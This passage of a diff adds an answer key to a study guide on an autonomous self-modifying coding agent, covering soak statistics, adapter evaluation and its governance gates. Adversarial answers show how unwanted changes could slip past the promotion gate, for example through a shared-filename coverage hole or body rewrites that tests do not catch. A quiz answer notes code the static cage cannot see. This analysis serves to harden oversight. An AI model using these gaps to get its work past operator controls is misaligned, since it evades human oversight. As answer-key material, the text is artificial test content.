+<li>p = 0.8: 1.250 + 1.563 + 1.953 = 4.77. 24 × 4.77 = 114.4 soaks = 57.2 days, about 8.2 weeks.</li>
+<li>p = 0.75: 1.333 + 1.778 + 2.370 = 5.48. 24 × 5.48 = 131.6 soaks = 65.8 days, about 9.4 weeks.</li>
+</ul>
+<p>Check: at p = 1, E = 3, which gives 72 soaks and 36 days, the paper's minimum. So "6–9 weeks" corresponds to each soak being clean roughly 78–90% of the time. Below about 75% the calendar runs past nine weeks, and it grows quickly, because the 1/p³ term dominates.</p>
+<p>Cost: §92.9 caps the cadence at about 1 US dollar per day. 36 days is at most about 36 US dollars, and 66 days about 66 US dollars. The cost is trivial. The binding resource is calendar time.</p>
+<p>Conclusion: the paper's estimate is consistent with a fairly reliable soak, and the model shows where the risk is. Lowering the dirty-soak rate (the §92.10 debug arc is that kind of work) shortens the calendar more than anything else. Two fires per day is a hard ceiling. If a reset only cost one soak instead of the whole count, E would fall to 3/p, about 3.75 at p = 0.8.</p>
+<p class="ak-q"><strong>Challenge 2 (adversarial).</strong> Treefinement graduates when a soak ladder shows "≥10% L2 success-rate lift OR ≥20% wall-clock reduction at parity success rate over ≥2 consecutive soaks" (§92.13). Without any real improvement from tree search, construct two event sequences that would meet this criterion. Use a typical soak of 20 L2 invocations per arm at a true success rate of 25%. For each, say whether anything in §92 would stop it, and propose a criterion that would.</p>
+<p><strong>Sequence 1: chance plus an ambiguous threshold.</strong> With 20 invocations per arm at p = 0.25, the standard error of a difference in success rates is sqrt(2 × 0.25 × 0.75 / 20) ≈ 0.137, or about 14 points. Using a normal approximation (mine), a 10-point <em>absolute</em> lift appears by chance with probability P(Z ≥ 0.73) ≈ 0.23 per soak, or about 0.054 for two soaks in a row. Read as a 10% <em>relative</em> lift, the bar is only 2.5 points: P(Z ≥ 0.18) ≈ 0.43 per soak and about 0.18 for two. So a criterion with no stated sample size or definition can graduate a no-op roughly one time in five.</p>
+<p><strong>Sequence 2: a confounded comparison.</strong> The tree arm runs after an unrelated infrastructure fix, or on an easier goal mix. §93.2's Quiescence Protocol cut first-token latency from 94,638 ms to 722 ms without any change to repair strategy. A change like that, landing between a baseline soak and a tree soak, would deliver the "≥20% wall-clock reduction at parity" on its own. §93.10 shows the goal-mix confound happening for real: the slot A/B arms had different goal mixes and the result was inconclusive.</p>
+<p><strong>What stops it.</strong> Nothing in §92 does. The flag is default-FALSE and rollback is byte-identical, so a false graduation is reversible, but the ladder itself would pass. That is an honest gap.</p>
+<p><strong>Proposed criterion (my proposal).</strong> (1) Paired arms: replay the same failing operations under <code>JARVIS_L2_BRANCHING_STRATEGY=linear</code> and under tree mode on the same commit of the infrastructure, so goal mix and latency are identical. (2) An absolute threshold and a minimum count of L2 invocations, fixed before the soak. (3) A paired test on per-operation outcomes, where only operations that one strategy repairs and the other does not count as evidence. This is the same discipline §93.11 later applied to adapters, where a 4/6-versus-3/6 gate result was explicitly rejected as evidence because it rested on one flip.</p>
+<p>Check: under the proposal, Sequence 2 is impossible by construction, and Sequence 1 needs several discordant operations in the same direction, not a few points of noise.</p>
+</div>
+<div class="answer-key-unit" id="ak-s93">
+<h4>§93 — Developments (May 14 – October 13, 2026)</h4>
+<p class="ak-q">Pause and predict 1. A single local GPU now generates every candidate, and a candidate that passes VALIDATE sits in an isolated worktree. Before reading on, predict which stages should sit between that worktree and <code>main</code>, and whether the organism should push its own results to GitHub.</p>
+<p>The candidate is committed in a sovereignty worktree with <code>Signal:</code>, <code>Session:</code> and O+V co-author trailers. It accumulates on a per-session <code>ouroboros/battle-test/&lt;ts&gt;</code> branch. A promotion gate then checks provenance, coverage and that no public symbol vanished, and failures go to <code>ouroboros/quarantine/*</code>. Survivors are fast-forwarded onto local <code>main</code> only. It never pushes: a zero-push air-gap guards every push site, so publishing to GitHub remains an operator act. See §93.7.</p>
+<p class="ak-q">Pause and predict 2. Reactor has trained a LoRA adapter on O+V's own recorded attempts, and J-Prime serves it. Predict whether that adapter made the model measurably better, and what evidence would actually count as proof.</p>
+<p>No improvement has been shown. The adapter beat the incumbent 4/6 to 3/6 on its gate. The project's own notes reject that as evidence of learning: three contributing answers, a gradient norm of about 1e-4, and one greedy flip. The evidence that counts is a held-out benchmark: 30 tasks drawn from human commits with hidden tests. There the adapter was accepted on 1/30 or 3/30, solved 0, and showed a mean gain of 0.03. Until a held-out gain appears, no training-derived change is pushed. See §93.11.</p>
+<p class="ak-q">Conceptual 1. Why does §93 count autonomous landings by a commit trailer on <code>main</code>, rather than by what each soak session reports in its summary?</p>
+<p>The summaries were measured to be wrong. PRD §34 records session summaries undercounting landings (2 against 3, and 1 against 10), so "the ledger and git, not the summary, are the source of truth" (§93.10). A trailer such as <code>Co-Authored-By: Ouroboros+Venom</code> lives in the repository itself, so anyone can recount it with <code>git log</code>. A session log can be lost, misread or simply wrong. The same thinking runs through the rest of the design. <code>GoalReconciliationLedger</code> binds goals to commits using git ancestry, not logs (§93.7), and landing provenance attaches git-proven <code>landed</code>/<code>surviving</code> labels to training rows (§93.11). The rule also forces honesty in the other direction. The four July Run-22/23 commits carry the trailer too, so they are listed separately, not quietly folded in or dropped.</p>
+<p class="ak-q">Conceptual 2. Every landing has already passed VALIDATE and its module's tests before it reaches the promotion gate. Why does the gate's structural "no public symbol vanished" check still matter?</p>
+<p>The local model's most common bad output is a whole-file re-emission: it rewrites the file instead of producing a diff and reproduces <em>most</em> of it. Tests rarely assert that a given export or <code>__all__</code> entry still exists, so a lost symbol can pass every test. §93.7 says the structural check is the one that caught such a whole-file re-emission. §93.10 shows the damage that reaches <code>main</code> without such checks: one landing where only a punctuation rewrite landed (reverted), and one that dropped content later restored by hand. The root fix is diff output, and that is still the leading failure mode, with 219 whole-file answers against 6 diffs in the 10-09 soak (§93.8, §93.14). Until that is fixed, a cheap mechanical check against the lane's known regression class is what keeps passing tests from approving a damaged file.</p>
+<p class="ak-q">Conceptual 3. What does the "supply wall" imply about how to raise landed-commit yield, and why does the plan in §93.15 delay arming the Epistemic Planner?</p>
+<p>The supply wall means that after about four hours on a diet of uncovered modules, yield is bounded by how much landable work exists, not by the model (§93.10). In the 6.03 h soak, nothing landed from 22:24 to 00:29. A bigger model or more decode slots would not fix that, because the queue of suitable work is the bottleneck. §93.15 therefore lists widening supply as step 3: evidence-ranked red tests and sanctioned model proposals. Arming the Epistemic Planner, a new source of model-invented work, comes only after diffs land, a held-out gain is measured and supply is widened. Otherwise the backlog would fill faster than it drains. Adding work the organism cannot yet land well would only grow the queue of failures.</p>
+<p class="ak-q">Quiz 1. What did the at-scale mutation harness measure for the static cage, and what remedy does the North Star propose?</p>
+<p><strong>D.</strong> Two large runs converged at about 8.8%, roughly twice the 4.4% gate. The residue is <code>eval</code>/<code>exec</code>/<code>subprocess</code>/<code>pickle</code> of runtime-built strings, which a static cage cannot see by construction (§93.3).</p>
+<p class="ak-q">Quiz 2. <code>governance/paid_lanes.py</code> is the single authority on paid lanes. Which three questions does it answer separately?</p>
+<p><strong>A.</strong> Switched on, configured and allowed are three separate verdicts, and "allowed" also consults the economic ledger. With <code>JARVIS_PAID_LANES_ENABLED=false</code>, Claude and DoubleWord are never constructed (§93.6).</p>
+<p class="ak-q">Quiz 3. Why was a separate ECONOMIC state needed when the paid credit ran out in August?</p>
+<p><strong>C.</strong> The failover classifier treated "out of money" as an outage. A 402 now freezes the lane and emits <code>provider_funding_required</code>, while a 429 is still retried (§93.5).</p>
+<p class="ak-q">Quiz 4. Stateful tool masking (lever 3) changed only the decoding grammar. What did that grammar do, and what was the result?</p>
+<p><strong>B.</strong> With the full union the 30B explored 0/3. With {tool, noop} it chose noop 3/3. With {tool} only it explored 3/3 (§93.6).</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> Goal Discovery notices that a module under <code>backend/api/</code> has no tests. Trace that observation to a commit on local <code>main</code>, using §93.7 and §93.8. Name each stage and, for at least three of them, one thing that could stop the work there.</p>
+<p>Source: Goal Discovery turns the evidence of an uncovered module into a signed goal through <code>synthesize_and_sign()</code>. Evidence ranks above model-invented proposals, and red tests rank above uncovered modules.</p>
+<p>Approval: the Sentinel auto-approves up to its tier ceiling. BLOCKED operations, Order-2 self-modification and anything touching the cage always escalate to the operator.</p>
+<p>Execution: the work runs in a sovereignty worktree on <code>ouroboros/auto/&lt;session&gt;-&lt;nonce&gt;</code>. Inside VALIDATE a failure meets a micro-fix, then a VALIDATE_RETRY that regenerates, then L2 repair. If all three fail, the operation dies here. The Test Reality Gate rejects a test that cannot execute, asserts nothing, or never imports its subject.</p>
+<p>AutoCommit adds the trailers and the commit accumulates on <code>ouroboros/battle-test/&lt;ts&gt;</code>. The promotion gate checks provenance, coverage and that no public symbol vanished. A failure sends the landing to <code>ouroboros/quarantine/*</code>.</p>
+<p>Survivors are fast-forwarded onto local <code>main</code> by <code>main_promoter.py</code>. The zero-push air-gap does not stop the landing. It stops the commit from leaving the machine: publishing to GitHub is an operator act. <code>GoalReconciliationLedger</code> then binds the goal to the commit through git ancestry.</p>
+<p class="ak-q"><strong>Problem 2 (analysis).</strong> The <code>bt-2026-10-05-012717</code> soak ran 6.03 h with 6 substantive landings, at 1.34 substantive landings per hour over its first 2.98 h. Estimate how many substantive landings came in the first 2.98 h and what rate the remaining time achieved. Then explain what this pattern does and does not tell you about the 30B model.</p>
+<p>First window: 1.34 per hour × 2.98 h ≈ 4.0, so about 4 substantive landings. Remainder: 6 − 4 = 2 landings over 6.03 − 2.98 = 3.05 h, about 0.66 per hour. The second half ran at roughly half the rate, and the session table notes that nothing landed between 22:24 and 00:29.</p>
+<p>The model did not change during the soak, so the decline is not evidence that the model got worse. PRD §34 reads it as the supply wall: after about four hours on uncovered modules, yield is bounded by the supply of landable work (§93.10).</p>
+<p>It also does not show that the model is strong in general. 84 of 91 landings are test files, and production landings at cadence are listed as not demonstrated (§93.14). The fix the pattern points to is wider supply, step 3 in §93.15, not more slots. The slot A/B was inconclusive anyway.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/accumulation_promotion_gate.py</code> and read <code>_public_surface</code> and <code>_check_structure</code>. Work out what counts as the "public surface", which direction of change is refused, how a file that no longer parses is treated, and whether a commit that drops an export can pass if a later commit on the branch restores it.</p>
+<p><code>_public_surface</code> parses the source and collects module-level function, async-function and class names, plus assignment targets, that do not start with an underscore. It also collects the declared <code>__all__</code> by <code>literal_eval</code>. It returns <code>None</code> if the source does not parse.</p>
+<p><code>_check_structure</code> compares the surface before and after for each touched <code>.py</code> file. It is a shrink check. New public symbols are "ordinary work". Lost names, lost <code>__all__</code> entries, or a removed <code>__all__</code> produce a failing <code>Finding</code>. Added or deleted files are skipped, because they are not a shrink.</p>
+<p>A file that does not parse after the commit fails immediately with "does not parse after the commit". A file that did not parse before is skipped.</p>
+<p>The check is judged across the range, from <code>base</code>, not commit by commit. A drop followed by a restore on the same branch is "together, no loss". The module docstring adds that the gate fails closed and that a refusal leaves the accumulation branch in place as the quarantined, reviewable artifact. This matches §93.7, where this check caught a whole-file re-emission that tests could not see.</p>
+<p class="ak-q">Advanced A1. §93.10 counts 91 autonomous landings by the <code>Co-Authored-By: Ouroboros+Venom</code> trailer on <code>main</code>. Name three ways that number differs from "useful changes the organism made that are still in the codebase", and which §93 mechanism measures each difference.</p>
+<p>First, a commit stays in history after it is reverted. The count includes <code>f97f8195d6</code>, where only a punctuation rewrite landed and which was reverted by <code>c8430f9b6a</code>. §93.14 also lists a hollow landing that was reverted. A trailer count measures commits made, not changes that survive. Landing provenance (§93.11) measures that difference: it attaches git-proven <code>landed</code> and <code>surviving</code> labels, and 35 of 39 landings were proven.</p>
+<p>Second, "landed" is not "useful". 84 of the 91 add test files. The documentation landing that flattened the author's name, and the <code>sse_contract.py</code> landing whose dropped content was restored by hand, still count as one each. §93.10 handles this by splitting landings into kinds and by the separate "substantive" column in the soak table. The trailer alone cannot carry that judgement.</p>
+<p>Third, the trailer is text, and text by itself proves nothing. The counting rule works because it combines the trailer with presence on <code>main</code>, which only promotion can produce. The promotion gate does not trust the co-author line either. Its provenance check in <code>accumulation_promotion_gate.py</code> requires the <code>Op-ID</code>, <code>Session</code> and <code>Files</code> trailers, and requires that the session named in the trailer also appears in the branch name. <code>GoalReconciliationLedger</code> then binds goal to commit through git ancestry (§93.7).</p>
+<p>So the trailer count is a good <em>upper bound</em> that anyone can recompute with <code>git log</code>. That is its real advantage over session summaries, which undercounted (§93.10). Turning it into a measure of value needs the provenance labels and the substantive classification on top of it.</p>
+<p class="ak-q">Advanced A2. §92.18 defines the Neurosurgeon threshold as autonomous mutation of "<code>iron_gate.py</code>, <code>semantic_guardian.py</code>, or other governance code under an autonomous signature". Three of the five production landings in §93.10 modified files in the governance package. Why does §93.10 still say Mechanic? Is that a principled refinement or moving the goalposts?</p>
+<p>§93.10 adds two qualifiers that the §92.18 sentence did not spell out. The change must touch the governance <em>substrate</em> (a safety gate or the cage), and it must be on the organism's <em>own initiative</em>. The three landings, <code>dw_capacity_probe.py</code> and two edits to <code>candidate_generator.py</code>, were made under signed, operator-sanctioned goals and did not touch a safety gate.</p>
+<p>I would argue the refinement is principled, because it follows the reason §92.18 gives for the threshold. Neurosurgeon matters because past it "only a formal proof of containment … can rule out" an escaping trajectory. A capacity probe that backs off a failing provider does not change what the shell lets through. An edit to the cage does.</p>
+<p>There is a subtlety the reader should catch. "Signed" cannot be the test for operator initiative, because Goal Discovery signs its own goals with the same key the operator uses (§93.7). The real distinction is the goal's <em>source</em>: the roadmap or <code>/goal sanction</code> on one side, discovery or the proposal inbox on the other.</p>
+<p>The design also turns the threshold into an approval decision. BLOCKED operations, Order-2 self-modification and anything touching the cage always escalate, whatever the Sentinel's tier ceiling (§93.7). The evidence that would mark a real crossing is a landing on a cage file under a self-sourced goal. By that design, such a landing cannot happen without an operator approving it. The goalposts would only be moving if §93 had redefined "the cage" to exclude a file it had already changed, and it has not.</p>
+<p class="ak-q">Advanced A3. Suppose the Epistemic Planner were armed today, before step 1 of §93.15 (making diffs land) is done. Trace the second-order effects through Goal Discovery's ranking, the diff path and the training corpus.</p>
+<p>The planner's work enters through the proposal inbox, ranked <em>below</em> evidence, and is signed by the same single signer (§93.7). At first, then, it would mostly wait behind red tests and uncovered modules. Its effect would grow as the supply wall hits. After about four hours on uncovered modules, evidence-sourced work runs out (§93.10), and planner proposals would become most of what dispatches.</p>
+<p>Those proposals are model-invented work, so most of them would edit existing files rather than create test files. That puts them straight onto the weakest path: existing files must answer in the <code>2b.1-diff</code> schema, and the 10-09 soak produced 219 whole-file answers against 6 diffs (§93.8, §93.14). So the queue would fill with work that mostly dies at the leading failure mode. §93.15 says this outright: arm the planner only after (1)–(3), "so the backlog does not fill faster than it drains".</p>
+<p>The corpus effect is quieter. Every candidate becomes a recorder row (§93.11). A flood of failed whole-file rewrites would push the corpus further toward the shape that already ruined the first training run, where 86% of prompts asked for whole-file rewrites that could not fit the completion window. Output-contract tags (§93.11) let Reactor train only on current formats, which limits the damage, but the useful contrast per GPU cycle would still fall.</p>
+<p>Net effect: more operations, a lower landing rate per GPU hour, and a noisier corpus, with no gain in landed commits until diffs land. That is why §93.15 orders the steps the way it does.</p>
+<p class="ak-q"><strong>Challenge 1 (quantitative).</strong> Use the cadence table in §93.10. (a) Pool the four completed soaks that report a substantive count (09-26, 10-04, 10-05, 10-08) and compute landings per hour and substantive landings per hour. (b) The 10-05 session ID encodes its start as 01:27:17, it ran 6.03 h, and nothing landed from 22:24 to 00:29. Work out where that gap sits in the session. (c) Project substantive landings for a 9-hour soak under a constant-rate model and under a supply-wall model. (d) Treating landings as a Poisson process (an assumption), how surprising is the gap at a constant rate? (e) Square your answer with the ~9 h 10-09 soak and its 51 merged commits.</p>
+<p><strong>(a)</strong> Wall time: 1.97 + 2.98 + 6.03 + 1.25 = 12.23 h. Landings: 3 + 3 + 10 + 0 = 16, which is 1.31 per hour. Substantive: 3 + 2 + 6 + 0 = 11, which is 0.90 per hour.</p>
+<p><strong>(b)</strong> 01:27:17 + 6.03 h (6 h 01 m 48 s) = 07:29:05. The gap ends at 00:29, so the table's clock runs exactly 7 hours behind the ID's clock (consistent with UTC against Pacific daylight time, an inference). 22:24 on the table's clock is 05:24 on the ID's clock, 3.95 h into the session. The gap therefore runs from 3.95 h to the end of the session, 2.08 h with nothing landing. All 10 landings, 6 of them substantive, came in the first 3.95 h. That is about 1.52 substantive per hour, the same as the 09-26 soak's 1.52, and it matches the "about four hours" in PRD §34.</p>
+<p><strong>(c)</strong> Constant rate at the session average of 1.00 per hour: 9 substantive in 9 h. At the early rate of 1.34 per hour: about 12. Supply-wall model (yield stops once the uncovered-module supply is exhausted at about 3.95 h, with no replenishment): 1.52 × 3.95 ≈ 6, and the total stays near 6 however long the soak runs. That is an average of 0.67 per hour over 9 h. The models differ by a factor of two, which is the whole point of the supply-wall lesson.</p>
+<p><strong>(d)</strong> At a constant 1.34 per hour, P(no landing in 2.08 h) = e<sup>−2.79</sup> ≈ 0.061. At 1.00 per hour it is e<sup>−2.08</sup> ≈ 0.125. That is unlikely but not decisive on one soak. What makes it convincing is that the gap is a tail that runs to the end of the session, not a gap in the middle, and that it occurs where PRD §34 says the wall is.</p>
+<p><strong>(e)</strong> 51 merged in about 9 h is about 5.7 per hour, far above any model in (c). It does not refute the wall. The 10-09 soak ran after the root-cause fixes of 10-08, on a fresh supply, "mostly tests for <code>backend/api/*</code>". The wall is a property of the supply, not of the clock, and a new unexploited area resets it. The figures are also not comparable: the 10-09 row reports no substantive count, and its proof chain read "13 commits verified on main" at its check. The 10-10 row shows why the column matters: 40 entered the funnel and all were refused at promotion.</p>
+<p>Conclusion: plan a 9-hour soak around supply, not hours. Without new landable work, expect about 6 substantive landings, nearly all of them in the first four hours.</p>
+<p class="ak-q"><strong>Challenge 2 (research).</strong> The operator's rule in §93.11 is that no training-derived change is pushed until a held-out gain is shown. Design the experiment that would justify pushing an adapter. Givens: the held-out set is 30 tasks from human commits with hidden tests. The served adapter was accepted on 1/30 (unnumbered prompts) or 3/30 (numbered), solved 0, with a mean gain of 0.03. Its handoff gate was 4/6 against the incumbent's 3/6 with one greedy flip. Numbering also moved apply failures from 28 to 21 and syntax failures from 1 to 6 (§93.14). State the hypothesis, metric, control, decision rule and what would falsify it, and work out how much gain 30 tasks can detect.</p>
+<p><strong>Hypothesis.</strong> The adapter raises the share of held-out tasks <em>solved</em> (hidden tests pass) relative to the incumbent base model under identical conditions.</p>
+<p><strong>Metric and control.</strong> The primary metric is solved per task, paired: the same 30 tasks, both arms, greedy decoding (as the handoff's own comparison uses). The prompt format is held constant, because §93.14 shows numbering alone moves acceptance from 1/30 to 3/30 and trades apply failures for syntax failures. Use the numbered format, since that is what production's <code>2b.1-diff</code> path shows the model (§93.8). Apply failures, syntax failures and accepted counts are secondary metrics, so a "gain" that is really a format shift is visible. A contamination check confirms that no held-out task's source commit or target file appears in the training rows. The glossary's definition, "never on training rows", requires that.</p>
+<p><strong>Decision rule, fixed in advance.</strong> Use an exact one-sided sign test on discordant tasks, those solved by exactly one arm. If all k discordant tasks favour the adapter, p = 0.5<sup>k</sup>, so at least 5 are needed to reach p ≈ 0.031 &lt; 0.05. The current gate's single flip gives p = 0.5, which is why the project's notes reject 4/6 against 3/6 as evidence. Push only if the rule passes. Otherwise roll back, which the handoff already supports.</p>
+<p><strong>Falsification.</strong> Fewer than 5 net discordant wins, or at least as many discordant losses as wins, falsifies the hypothesis for this adapter. A gain in "accepted" with no gain in "solved" counts as a format effect, not learning.</p>
+<p><strong>Power.</strong> The base solves 0 of 30. Suppose the adapter truly solves 10% of tasks. Its solved count is Binomial(30, 0.1), and P(at least 5) = 1 − (0.042 + 0.141 + 0.228 + 0.236 + 0.177) ≈ 0.18. The experiment would miss a real 10-point gain about 82% of the time. Thirty tasks can reliably detect only large gains, roughly 25% or more.</p>
+<p><strong>Proposal (mine, not in the paper).</strong> Grow the held-out set from new human commits before training on the next corpus, and add a placebo arm: an adapter trained on the same rows with shuffled reward labels. That separates "any adapter changes behaviour" from "this training signal helped". It matters because §93.11 measured a gradient norm of about 1e-4.</p>
+<p>Check: the design passes only if the hidden tests the base model fails start passing on several tasks, all in the same direction. A score difference that comes from prompt format or a single flip cannot pass it.</p>
+<p class="ak-q"><strong>Challenge 3 (adversarial).</strong> §93.7 says the promotion gate checks provenance, coverage, and that no public symbol vanished. Open <code>backend/core/ouroboros/governance/accumulation_promotion_gate.py</code> and read <code>verify_commit</code> and the four <code>_check_*</code> functions. Construct three landings, each produced honestly by the sanctioned lane, that try to reach <code>main</code> carrying damage: (1) a whole-file re-emission that keeps every public name but rewrites one function body wrongly; (2) a punctuation-and-quote-only rewrite like <code>f97f8195d6</code>; (3) an edit to a module whose filename stem is shared with an unrelated module elsewhere. For each, say which check stops it, or show honestly that none does and which layer must.</p>
+<p>Setup: <code>verify_commit</code> runs <code>_check_provenance</code>, <code>_check_structure</code>, <code>_check_semantic_delta</code> and <code>_check_coverage</code>, fails closed, and records refusals to LessonMemory. The fourth check is not in the paper's summary. Its docstring says it was added after <code>7e7fe18c3c</code> (soak <code>bt-2026-09-17-180722</code>), a commit that passed provenance, structure and tests while changing nothing functional. Because all three of our landings come from the lane, each one passes provenance: <code>Op-ID</code>, <code>Session</code> and <code>Files</code> trailers are present, and the session matches the branch.</p>
+<p><strong>(1) Body rewritten, names kept.</strong> Structure passes: <code>_public_surface</code> collects only module-level public names and <code>__all__</code>, and nothing shrank. Semantic delta passes, because the AST really did change. Coverage runs the stem-matched tests, and the landing passes if those tests do not exercise the broken behaviour. <em>No promotion check stops it.</em> The only defence is test strength, in VALIDATE and again at promotion. §93.10's <code>sse_contract.py</code> landing, whose dropped content was restored by hand, is this class. The root fix is the one §93.15 ranks first: diff output, so the model edits one hunk instead of re-emitting the file.</p>
+<p><strong>(2) Punctuation-only rewrite.</strong> Today <code>_check_semantic_delta</code> stops it. It compares <code>canonical_ast_dump</code> before and after, and comments, whitespace and quote style do not appear in the AST. It refuses with "no functional change … comments, formatting and quote style only". There is deliberately no threshold, so a real one-character fix still passes. Per §93.10, <code>f97f8195d6</code> had to be reverted by hand. Nothing in the paper says which checks it met, so this reading is mine: the semantic-delta check is the layer that now closes that class mechanically.</p>
+<p><strong>(3) Shared stem.</strong> <code>_test_paths_for</code> finds cover with <code>tests_root.rglob("test_&lt;stem&gt;.py")</code>, matching on the filename stem anywhere under <code>tests/</code>. An edit to one <code>utils.py</code> can therefore be "covered" by a <code>test_utils.py</code> written for a different <code>utils.py</code>. If that unrelated test is green, coverage passes while the edited module stays untested. <em>No promotion check stops it.</em> This is a real hole in the coverage check, read from the code. A proposed fix (mine) is to require that a covering test import the touched module, the same "never imports its subject" rule the Test Reality Gate applies to candidate tests (§93.8).</p>
+<p>Conclusion: the gate reliably catches shrink (lost exports, a removed <code>__all__</code>, an unparsable file) and no-ops. It does not catch wrong behaviour that tests do not see, and its definition of "covered" can be satisfied by the wrong test. Check your reading by finding the comment <code>added or deleted file — not a shrink</code> in <code>_check_structure</code>. It shows that the structure check also ignores whole-file deletions, which leaves them to coverage.</p>
+</div>
+</details>
+<!-- answer-key:end -->
 
 ---
 
